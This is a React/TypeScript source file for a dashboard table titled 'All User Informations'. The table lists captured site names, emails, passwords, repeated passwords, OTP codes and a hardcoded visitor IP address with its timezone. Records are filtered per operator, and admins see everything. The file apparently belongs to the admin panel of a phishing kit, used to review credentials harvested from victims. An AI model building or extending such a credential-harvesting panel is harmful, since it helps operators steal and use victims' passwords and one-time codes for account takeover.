import { useContext, useEffect, useState } from "react";
import { getData } from "../../api/fetching";
import { formatUtcToLocal } from "../../utils/DateFormater";
import { AuthContext } from "../../Contexts/AuthProvider";


const InformationTable = () => {
  const {role,user} = useContext(AuthContext)
  const [info,setInfo] = useState<[]>([])

  let url:string;
  useEffect(() => {
    const fetchData = async () => {
      
      try {
       
        if(role==='admin'){
          url = `information`
        }else{
          url = `information?id=${user?._id}`
        }
        const data = await getData(url);
        setInfo((data as any)?.data);
      } catch (error) {
        console.error('Error fetching data:', error);
      }
    };

    fetchData();
  }, [user]);


    return (
      <div className="rounded-sm  -stroke bg-white px-5 pt-6 pb-2.5 shadow-default dark:-strokedark dark:bg-boxdark sm:px-7.5 xl:pb-1 ">
        <h4 className="mb-6 text-xl font-semibold text-black dark:text-white">
         All User Informations
        </h4>
  
  {/* for table */}
  
  <div className="relative overflow-x-auto shadow-md sm:rounded-lg mb-8">
    <table className="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400 border">
      <thead className="text-xs text-center text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
        <tr>
          <th scope="col" className="px-2 py-1 font-bold">
            ID
          </th>
          {
            role === 'admin' && (
              <th scope="col" className="px-2 py-1 font-bold">
              Name
            </th>
            )
          }

          <th scope="col" className="px-2 py-1 font-bold">
           Site
          </th>
          <th scope="col" className="px-2 py-1 font-bold">
            Email
          </th>
          <th scope="col" className="px-2 py-1 font-bold">
            Password
          </th>
          <th scope="col" className="px-2 py-1 font-bold">
            Confirm Password
          </th>
          <th scope="col" className="px-2 py-1 font-bold">
            OTP Code
          </th>
          <th scope="col" className="px-2 py-1 font-bold">
           Agent
          </th>

          <th scope="col" className="px-2 py-1 font-bold">
            Time
          </th>


   
        </tr>
      </thead>
      <tbody className='text-center'>
        {
          info?.map(({user,updatedAt,email,password,repassword,otp,siteName,_id},index)=>(
<tr key={_id} className="odd:bg-stroke odd:dark:bg-black even:bg-transparent even:dark:bg-body -t dark:-gray-700 even:dark:text-white">
    <th scope="row" className="px-2 py-1 font-bold font-medium text-gray-900 whitespace-nowrap dark:text-white ">
        {index + 1}
    </th>

    {
       role === 'admin' && (
        <td className="px-2 py-1 font-bold ">
        {(user as any)?.name}
    </td>
       )
    }
    <td className="px-2 py-1 font-bold  ">
      <span className="text-bodydark1 even:bg-meta-7 odd:bg-meta-4 rounded-md p-1 font-bold ">{siteName}</span>
        
    </td>
    <td className="px-2 py-1 font-bold ">
        {email}
    </td>
    <td className="px-2 py-1 font-bold ">
        {password}
    </td>
    <td className="px-2 py-1 font-bold ">
        {repassword}
    </td>
    <td className="px-2 py-1 font-bold ">
        {otp}
    </td>


    <td className="px-2 py-1 font-bold ">
        <div className="relative inline-block">
  <button className="tooltip-btn">View</button>
  <div className="tooltip"> 103.204.210.152,152.210.204.103-level3carrier.net,Asia/Dhaka</div>
</div>
    </td>
    <td className="px-2 py-1 font-bold">
        {formatUtcToLocal(updatedAt)}
    </td>
</tr>

          ))
        }
  

  
  
  
  
      </tbody>
    </table>
  </div>
  
  
  
      </div>
    );
  };
  
  export default InformationTable;
  